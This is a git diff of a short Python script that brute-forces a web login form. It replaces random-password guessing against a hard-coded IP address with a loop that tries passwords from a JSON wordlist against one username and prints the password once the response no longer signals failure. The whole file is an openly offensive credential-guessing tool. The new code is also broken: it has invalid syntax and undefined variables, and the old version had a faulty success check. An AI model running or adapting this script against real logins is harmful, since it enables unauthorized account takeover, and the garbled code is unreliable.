@@ -4,32 +4,30 @@ import random
 import string
 import json
 
-def post_it(name):
+target_url = 'http://example.com/login.html'
+if_contains_then_invalid[] = {}
 
-    # name_extra = ''.join(random.choice(string.digits)) // Salt
+def post_it(password):
 
-    username = name.lower()
-    password = ''.join(random.choice(chars) for i in range(8))
+    password = password.lower()
+    
+    # chars = string.ascii_letters + string.digits
+    # random.seed = (os.urandom(1024))
+    # password = password.join(random.choice(string.digits)) // Salt
+    # password = password.join(random.choice(chars) for i in range(8))
 
     response = requests.post(url, allow_redirects=False, data={
-    	'username': username,
-    	'password': password,
+    	'username': username, # 'username-element-name': 'entered-target-username'
+    	'password': password, # 'password-element-name': 'password-from-json'
         'Submit': "submit"
     })
 
-    print('sending username '+username+' and password '+password+"\t"+str(response.content))
-    if "not permission" and "is invalid" not in str(response.content):
-        print("[+] {} : {} Worked".format(username, password))
+    print('testing password+'+password+' on '+username+'\t'+str(response.content))
+    if if_contains_then_invalid not in str(response.content):
+        print("[+] {}s password is {}".format(username, password))
         exit(0)
 
 if __name__ == "__main__":
-
-    chars = string.ascii_letters + string.digits
-    random.seed = (os.urandom(1024))
-
-    url = 'http://83.160.88.114:8080/home.htm'
-
-    names = json.loads(open('names.json').read())
-
-    for name in names:
-      post_it(name)
+    passwords = json.loads(open('password.json').read())
+    for password in passwords:
+      post_it(password)
